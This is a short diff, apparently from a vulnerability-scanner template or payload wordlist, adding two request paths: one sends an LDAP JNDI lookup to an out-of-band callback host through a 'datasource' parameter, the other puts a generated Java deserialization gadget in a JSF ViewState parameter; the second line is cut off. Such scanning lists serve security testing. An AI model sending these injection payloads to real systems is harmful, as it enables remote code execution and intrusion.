@@ -1,0 +1,2 @@
+/decisioncenter-api/v1/about?datasource=ldap://{{interactsh-url}}
+/res/login.jsf?javax.faces.ViewState={{generate_java_gadget(
